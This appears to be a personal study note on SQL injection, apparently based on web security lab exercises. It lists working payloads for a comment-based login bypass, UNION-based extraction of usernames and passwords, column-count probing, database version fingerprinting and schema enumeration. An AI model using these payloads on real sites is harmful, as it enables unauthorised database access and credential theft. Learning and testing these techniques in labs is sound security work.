	1. SQLi test

```vulnurableSQL
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

```vulnurableURL
https://insecure-website.com/products?category=Gift
```

```injection
https://insecure-website.com/products?category=Gifts'--
```

	2. Boolean based

```vulnsql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

```injection
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

why? because the password check removed by comment

	3. Union based SQLi

```vulnSQL
SELECT name, description FROM products WHERE category = 'Gifts'
```

```injection
' UNION SELECT username, password FROM users--
```


to discover the number of collumns use 

```
' ORDER BY 1-- 
' ORDER BY 2-- 
' ORDER BY 3--
```


or
`
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

for oracle

```
' UNION SELECT NULL FROM DUAL--
```

then we need to find collumns with useful data types

```
' UNION SELECT 'a',NULL,NULL,NULL-- 
' UNION SELECT NULL,'a',NULL,NULL-- 
' UNION SELECT NULL,NULL,'a',NULL-- 
' UNION SELECT NULL,NULL,NULL,'a'--
```

get multiple values from a single column

```
' UNION SELECT username || '~' || password FROM users--
```

	4. Examining the database

```
Microsoft, MySQL `SELECT @@version`

Oracle `SELECT * FROM v$version`

PostgreSQL `SELECT version()`
```

u can also use

```
' UNION SELECT @@version--
' union select banner,null from v$version --
```

	5.

listing contents of the database (! doesn't work on Oracle !)

```
SELECT * FROM information_schema.tables
```

![[Pasted image 20220613211405.png]]

```
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

for Oracle

```
SELECT * FROM all_tables
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```